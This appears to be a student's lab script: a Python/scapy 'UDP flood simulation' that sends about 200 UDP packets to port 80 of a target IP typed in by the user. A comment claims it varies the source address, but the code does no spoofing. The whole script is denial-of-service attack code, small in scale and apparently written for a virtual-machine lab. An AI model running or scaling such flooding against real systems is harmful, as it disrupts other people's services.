"""zainab saad
    202472448"""
from scapy.all import IP, UDP, send, RandShort,RandIP
from main_config import validate_ip

# sudo python3 /home/vboxuser/attack_folder/udp_flood.py
# This UDP flood aim to change the source that sending packet 
# Ask for target IP address
target_ip = validate_ip("Enter target IP: ")



def udpflood_simulation(target_ip):
    counter = 0
    # create the ip layer that has source ip and destination ip (victim)
    ip_layer = IP(dst=target_ip)
    # create UDP layer that target port 80 in this case
    udp_layer = UDP(dport=80)
    # comine layer of IP and UDP
    packet = ip_layer / udp_layer
    # create a  loop to flood port
    for i in range(1,200):
        counter = counter + 1
        # send packet 
        send(packet, verbose=False)
        with open("count.txt", "w") as f:
              f.write(str(counter))

# Run UDP flood simulation
udpflood_simulation(target_ip)
